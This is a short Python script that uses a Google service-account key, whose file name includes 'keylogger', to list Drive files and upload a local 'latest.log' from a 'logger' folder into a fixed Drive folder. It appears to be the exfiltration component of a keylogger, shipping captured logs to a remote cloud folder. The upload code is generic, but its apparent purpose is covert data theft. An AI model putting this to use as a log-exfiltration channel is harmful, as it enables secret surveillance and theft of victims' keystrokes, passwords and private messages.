from google.oauth2 import service_account
from googleapiclient.http import MediaIoBaseDownload,MediaFileUpload
from googleapiclient.discovery import build
import pprint
import io

pp = pprint.PrettyPrinter(indent=4)

SCOPES = ['https://www.googleapis.com/auth/drive']
SERVICE_ACCOUNT_FILE = 'C:/Users/nikot/Desktop/logger/keylogger-282819-7c70753b5a94.json'
credentials = service_account.Credentials.from_service_account_file(
        SERVICE_ACCOUNT_FILE, scopes=SCOPES)
service = build('drive', 'v3', credentials=credentials)
results = service.files().list(pageSize=10,
                               fields="nextPageToken, files(id, name, mimeType)").execute()
pp.pprint(results)

folder_id = '1KrHbzTNzYN__XogOqaeUeDo0nkxWqkcN'
name = 'latest.log'
file_path = 'C:/Users/nikot/Desktop/logger/latest.log'
file_metadata = {
                'name': name,
                'parents': [folder_id]
            }
media = MediaFileUpload(file_path, resumable=True)
r = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
pp.pprint(r)